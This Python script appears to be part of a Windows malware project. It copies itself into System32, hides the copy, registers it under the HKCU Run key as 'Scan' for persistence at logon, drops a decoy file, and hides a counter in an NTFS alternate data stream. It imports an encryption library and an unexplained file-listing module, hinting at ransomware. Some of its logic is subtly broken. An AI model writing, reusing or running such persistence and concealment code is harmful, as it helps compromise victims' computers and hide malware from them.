import os
import shutil
import winreg
import time
from cryptography.fernet import Fernet
import subprocess
import signal
from termcolor import colored
import allfiles1
import sys
# import cv2
import ctypes

def on_logon_registry(c_dir, file_e):
    dest_dir = r"C:\Windows\System32"
    try:
        if file_e not in dest_dir:
            shutil.copy2(file_e, dest_dir)
            time.sleep(4)
        if file_e in c_dir:
            c_dir.remove(file_e)
        new_filepath = os.path.join(dest_dir, file_e)
        ctypes.windll.kernel32.SetFileAttributesW(new_filepath, 2)
        regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

        reghive = winreg.HKEY_CURRENT_USER
        reg = winreg.ConnectRegistry(None, reghive)
        key_reg = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_WRITE)
        winreg.SetValueEx(key_reg, "Scan", 0, winreg.REG_SZ, new_filepath)
        print(colored(f"\n[!] Persistent success", "green"))

    except Exception as e:
        pass

def read_executions_from_ads(file_path):
    ads_path = f"{file_path}:executions"
    try:
        with open(ads_path, "r") as f:
            return int(f.read().strip())
    except FileNotFoundError:
        return 0

def write_executions_to_ads(file_path, value):
    ads_path = f"{file_path}:executions"
    with open(ads_path, "w") as f:
        f.write(str(value))
    print(colored(f"\n[!] Ads success", "red"))

def create_file_in_system32(filename, content):
    system32_dir = "C:\Windows\System32\/"

    file_path = os.path.join(system32_dir, filename)

    try:
        with open(file_path, "w", encoding="utf-8") as file:
            file.write(content)
        print(colored(f"\n[!] File created in system32", "red"))
    except PermissionError:
        print(colored(f"\n[!] Permission Error", "red"))
    except Exception as e:
        print(f"Error: {e}")

#current_dir = os.getcwd()
create_file_in_system32("windows.txt", "Windows system")

name_with_dir = os.path.abspath(__file__)
time.sleep(2)
dir_current = os.path.dirname(os.path.abspath(__file__))
on_logon_registry(dir_current, name_with_dir)
time.sleep(2)
write_executions_to_ads("C:\Windows\System32\windows.txt", 2)
time.sleep(2)
executions = read_executions_from_ads("C:\Windows\System32\windows.txt")
time.sleep(2)

print(executions)
